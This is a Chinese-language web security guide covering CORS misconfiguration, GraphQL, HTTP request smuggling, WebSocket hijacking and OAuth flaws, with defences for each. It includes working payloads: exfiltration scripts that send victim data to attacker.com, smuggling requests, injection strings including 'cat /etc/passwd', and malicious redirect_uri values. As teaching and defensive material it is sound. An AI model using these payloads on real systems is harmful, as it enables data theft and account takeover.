# 现代Web协议安全

> **来源**: 基于WooYun漏洞库、OWASP及业界安全实践提炼，涵盖CORS、GraphQL、HTTP走私、WebSocket、OAuth五大现代Web协议攻击面。
> **方法论**: WooYun漏洞本质公式 + L1-L4系统化分析

---

## 一、CORS错误配置

### 1.1 漏洞本质

```
CORS风险 = Access-Control-Allow-Origin配置过宽 × 敏感接口缺乏额外鉴权
```

浏览器同源策略本是安全屏障，CORS错误配置将其打破，允许恶意站点跨域读取用户敏感数据。

### 1.2 检测方法

```bash
# 基础检测: 发送自定义Origin观察响应
curl -H "Origin: https://evil.com" -I https://target.com/api/userinfo
# 检查响应头:
# Access-Control-Allow-Origin: https://evil.com  → 危险!
# Access-Control-Allow-Credentials: true          → 可携带Cookie跨域请求
```

**危险配置模式**

| 模式 | 风险 | 说明 |
|------|------|------|
| `Access-Control-Allow-Origin: *` | 高 | 通配符，任意域可读取(但不可带Cookie) |
| 动态反射Origin | 极高 | 将请求Origin直接作为响应头返回 |
| `null` Origin允许 | 高 | `<iframe sandbox>`可构造null来源 |
| 正则匹配缺陷 | 高 | `evil.com.attacker.com`匹配`evil.com` |
| 子域通配 | 中 | `*.target.com`含已失控的子域 |

### 1.3 利用方式

```html
<!-- 恶意页面: 跨域窃取用户数据 -->
<script>
fetch('https://target.com/api/userinfo', {credentials: 'include'})
  .then(r => r.json())
  .then(d => fetch('https://attacker.com/steal?data=' + JSON.stringify(d)));
</script>

<!-- null Origin利用 -->
<iframe sandbox="allow-scripts allow-top-navigation" src="data:text/html,
<script>
fetch('https://target.com/api/userinfo',{credentials:'include'})
.then(r=>r.text()).then(d=>parent.postMessage(d,'*'))
</script>">
</iframe>
```

### 1.4 防御措施

- **严格白名单校验Origin**：不要动态反射，使用精确匹配列表
- 避免`Access-Control-Allow-Origin: *`与`Access-Control-Allow-Credentials: true`同时使用
- 避免允许`null` Origin
- 正则匹配必须锚定(^和$)，防止子串匹配绕过
- 敏感接口增加CSRF Token等额外鉴权，不仅依赖CORS

---

## 二、GraphQL安全

### 2.1 漏洞本质

```
GraphQL风险 = 强大的查询能力 × 默认开放的内省机制 × 缺乏细粒度鉴权
```

GraphQL单一端点暴露全部数据模型，内省机制提供完整API文档，攻击者无需猜测接口。

### 2.2 内省查询 - 信息泄露

```graphql
# 获取完整Schema（类型、字段、参数）
{__schema{types{name,fields{name,args{name,type{name}}}}}}

# 精简版：仅获取查询类型
{__schema{queryType{name,fields{name}}}}

# 获取mutation列表
{__schema{mutationType{name,fields{name,args{name}}}}}
```

### 2.3 常见攻击向量

**注入攻击**

```graphql
# 参数拼接导致SQL注入
{ user(name: "admin' OR '1'='1") { id email } }

# NoSQL注入
{ user(filter: "{\"username\": {\"$gt\": \"\"}}") { id email } }
```

**批量查询DoS（嵌套查询耗尽资源）**

```graphql
# 深度嵌套 - 指数级数据库查询
{ user(id:1) { friends { friends { friends { friends { name } } } } } }

# 别名批量查询 - 单次请求枚举大量数据
{ a: user(id:1){name} b: user(id:2){name} c: user(id:3){name} ... }

# 批量mutation暴力破解
mutation { login1: login(user:"admin",pass:"123"){token} login2: login(user:"admin",pass:"456"){token} }
```

**认证绕过**

```graphql
# mutation缺少鉴权检查
mutation { deleteUser(id: 1) { success } }
mutation { updateRole(userId: 1, role: "admin") { success } }
```

### 2.4 防御措施

- **禁用生产环境内省查询**：检查`__schema`/`__type`请求并拒绝
- 查询深度限制(推荐最大10层)与复杂度分析
- 速率限制与查询超时(防批量/嵌套DoS)
- 字段级权限控制(每个resolver独立鉴权)
- 输入参数化处理(防注入)、禁止字符串拼接构建查询
- 使用持久化查询(Persisted Queries)，仅允许预注册的查询执行

---

## 三、HTTP请求走私

### 3.1 漏洞本质

```
前端代理(CDN/LB) 与 后端服务器 对HTTP请求边界的解析不一致
→ 一个TCP连接中"走私"了额外的请求 → 影响其他用户的请求处理
```

核心矛盾：`Content-Length`(CL) 与 `Transfer-Encoding: chunked`(TE) 同时存在时，前后端选择不同的头部进行解析。

### 3.2 三种攻击类型

| 类型 | 前端解析 | 后端解析 | 说明 |
|------|----------|----------|------|
| CL.TE | Content-Length | Transfer-Encoding | 前端按CL转发，后端按TE解析 |
| TE.CL | Transfer-Encoding | Content-Length | 前端按TE转发，后端按CL解析 |
| TE.TE | Transfer-Encoding | Transfer-Encoding | 混淆TE头使一方忽略 |

### 3.3 经典Payload

**CL.TE走私**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**TE.CL走私**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

**TE.TE混淆变体**

```http
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: identity
Transfer-Encoding:chunked
```

### 3.4 检测与利用

```
检测方法:
1. 发送CL/TE冲突请求，观察超时/响应异常
2. 走私一个不完整请求，看后续请求是否受影响
3. 工具: Burp Suite HTTP Request Smuggler扩展

利用场景:
- 绕过前端WAF/ACL → 走私恶意请求到后端
- 劫持其他用户请求 → 窃取Cookie/Session
- 缓存投毒 → 走私请求污染CDN缓存内容
- 请求路由劫持 → 将请求导向任意后端
```

### 3.5 防御措施

- 前后端使用统一的HTTP解析库/版本
- 禁止同时出现CL和TE头，拒绝模糊请求
- 禁用HTTP/1.0 Keep-Alive后端连接复用
- 升级到HTTP/2(二进制帧协议，天然免疫CL/TE歧义)
- CDN/LB配置规范化请求头后再转发

---

## 四、WebSocket安全

### 4.1 漏洞本质

```
WebSocket风险 = HTTP握手后脱离传统安全模型 × 持久双向通道缺乏逐消息鉴权
```

WebSocket连接一旦建立，后续消息不再经过标准HTTP安全机制(Cookie SameSite/CSRF Token等)。

### 4.2 跨站WebSocket劫持(CSWSH)

```html
<!-- 恶意页面: 劫持用户WebSocket连接 -->
<script>
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
    ws.send('{"action":"getPrivateData"}');  // 以受害者身份发送请求
};
ws.onmessage = function(e) {
    // 窃取响应数据
    fetch('https://attacker.com/steal?data=' + encodeURIComponent(e.data));
};
</script>
```

**原理**：WebSocket握手是标准HTTP请求，浏览器会自动携带Cookie。若服务端不验证Origin头，恶意页面可建立经过认证的ws连接。

### 4.3 消息注入

```javascript
// 通过WebSocket发送注入payload
ws.send('{"query": "admin\' OR 1=1--"}');          // SQL注入
ws.send('{"msg": "<img src=x onerror=alert(1)>"}'); // XSS
ws.send('{"cmd": "ls; cat /etc/passwd"}');           // 命令注入
```

### 4.4 认证不足

| 问题 | 风险 | 说明 |
|------|------|------|
| 仅握手时认证 | Session过期后连接仍有效 | ws连接可持续数小时 |
| 无消息级鉴权 | 任何已连接客户端可执行全部操作 | 缺乏per-message授权检查 |
| Token明文传输 | WebSocket不加密(ws://) | 使用wss://强制加密 |

### 4.5 防御措施

- **验证Origin头**：握手时检查Origin是否在白名单内(防CSWSH)
- **Token鉴权**：握手时通过URL参数或首条消息传递Token(不依赖Cookie)
- **消息校验**：对每条消息做输入验证和输出编码(防注入)
- 使用wss://强制加密传输
- 实现心跳机制和Session超时自动断开
- 消息速率限制(防DoS)

---

## 五、OAuth 2.0/OIDC安全

### 5.1 漏洞本质

```
OAuth风险 = 复杂的多方交互流程 × 参数校验不严格 × 实现偏离规范
```

OAuth授权流程涉及客户端、授权服务器、资源服务器三方交互，任何一环配置不当都可导致Token泄露或账户接管。

### 5.2 redirect_uri操纵

```
# 正常流程
https://auth.target.com/authorize?response_type=code&client_id=app&redirect_uri=https://app.com/callback

# 攻击: 篡改redirect_uri窃取授权码
redirect_uri=https://attacker.com/steal           # 完全替换
redirect_uri=https://app.com.attacker.com/callback # 子域混淆
redirect_uri=https://app.com/callback/../../../attacker # 路径遍历
redirect_uri=https://app.com/callback?next=https://attacker.com # 开放重定向链
```

### 5.3 常见攻击向量

| 攻击类型 | 原理 | 利用条件 |
|----------|------|----------|
| CSRF攻击 | state参数缺失或可预测 | 将攻击者账号绑定到受害者 |
| Token泄露(Referer) | 隐式模式token在URL Fragment中 | 页面含外部资源引用 |
| Token泄露(日志) | 授权码/token记录在服务端日志 | 日志可访问 |
| PKCE绕过 | 公共客户端未使用code_challenge | 拦截授权码即可换取token |
| IdP混淆(Mix-Up) | 多IdP场景下混淆授权响应来源 | 客户端支持多个OAuth提供商 |
| 授权码重放 | 授权码未一次性使用 | 拦截授权码后重复兑换 |

### 5.4 CSRF与state参数

```
# 攻击流程 (state缺失时)
1. 攻击者发起OAuth授权，获取自己账号的授权码
2. 构造链接: https://app.com/callback?code=ATTACKER_CODE
3. 诱骗受害者点击 → 受害者账号绑定攻击者的第三方账号
4. 攻击者用第三方账号登录 → 接管受害者账户

# 防御: state参数
state=随机不可预测值(绑定用户Session)
→ 回调时校验state与Session匹配
```

### 5.5 隐式模式风险

```
# 隐式模式(Implicit Flow) - 已不推荐
https://app.com/callback#access_token=eyJ...&token_type=bearer

风险:
- Token在URL Fragment中，可被浏览器历史/Referer头泄露
- 无法使用refresh_token，用户体验差
- 无法绑定客户端身份(无client_secret)

→ 替代方案: Authorization Code Flow + PKCE
```

### 5.6 防御措施

- **严格redirect_uri白名单**：精确匹配(不允许通配符/子路径)
- **强制state参数**：绑定Session、不可预测、一次性使用
- **强制PKCE**：所有客户端(尤其公共客户端/SPA)必须使用code_challenge
- 使用Authorization Code Flow，弃用Implicit Flow
- 授权码一次性使用，短有效期(推荐10分钟内)
- Token绑定(DPoP/mTLS)防止Token被盗用
- 定期审计已授权的第三方应用和权限范围

---

*基于WooYun漏洞库(88,636条)提炼 + OWASP/RFC安全标准 | 仅供安全研究与防御参考*
